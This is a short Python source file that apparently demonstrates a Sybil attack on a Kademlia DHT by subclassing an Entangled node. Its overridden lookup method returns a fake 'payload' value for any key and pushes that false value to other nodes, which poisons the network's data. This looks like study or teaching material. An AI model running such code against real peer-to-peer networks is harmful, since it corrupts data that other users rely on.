#!/usr/bin/env python

# The Sybil class for a Kademila node.
# Chris Piraino

from twisted.internet import defer

from entangled.node import EntangledNode

def rpcmethod(func):
    func.rpcmethod = True
    return func

class SybilNode(EntangledNode):
    """ An Entangled node that shows how a sybil attack can be implemented
    and the different attack vectors that can be taken. """

    def __init__(self, id=None, udpPort=5000, dataStore=None, routingTable=None, networkProtocol=None):
        EntangledNode.__init__(self, id, udpPort, dataStore, routingTable, networkProtocol)

    # Override the iterativeFindValue method in order to return a payload from the Sybil Node.
    def iterativeFindValue(self, key):
        """ The Kademlia search operation (deterministic)
        
        Call this to retrieve data from the DHT.
        
        @param key: the 160-bit key (i.e. the value ID) to search for
        @type key: str
        
        @return: This immediately returns a deferred object, which will return
                 either one of two things:
                     - If the value was found, it will return a Python
                     dictionary containing the searched-for key (the C{key}
                     parameter passed to this method), and its associated
                     value, in the format:
                     C{<str>key: <str>data_value}
                     - If the value was not found, it will return a list of k
                     "closest" contacts (C{kademlia.contact.Contact} objects)
                     to the specified key
        @rtype: twisted.internet.defer.Deferred
        """
        # Prepare a callback for this operation
        outerDf = defer.Deferred()
        def checkResult(result):
            
            # An arbitrary payload.
            value = 'payload'
            if type(result) == dict:
                result[key] = value
                # We have found the value; now see who was the closest contact without it...
                if 'closestNodeNoValue' in result:
                    # ...and store the key/value pair
                    contact = result['closestNodeNoValue']
                    contact.store(key, value)
                #Let's be really mean and send back the wrong value.
                outerDf.callback(result)
            else:
                # The value wasn't found, but a list of contacts was returned
                # Now, see if we have the value (it might seem wasteful to search on the network
                # first, but it ensures that all values are properly propagated through the
                # network
                if key in self._dataStore:
                    # Send this payload to other nodes to really mess things up.
                    if len(result) > 0:
                        contact = result[0]
                        contact.store(key, value)
                    outerDf.callback({key: value})
                else:
                    # Ok, value does not exist in DHT at all
                    outerDf.callback(result)
        
        def errorCallback(error):
          print 'An error has occurred: ', error.getErrorMessage()
        
        # Execute the search
        df = self._iterativeFind(key, rpc='findValue')
        df.addCallback(checkResult)
        df.addErrback(errorCallback)
        return outerDf

    
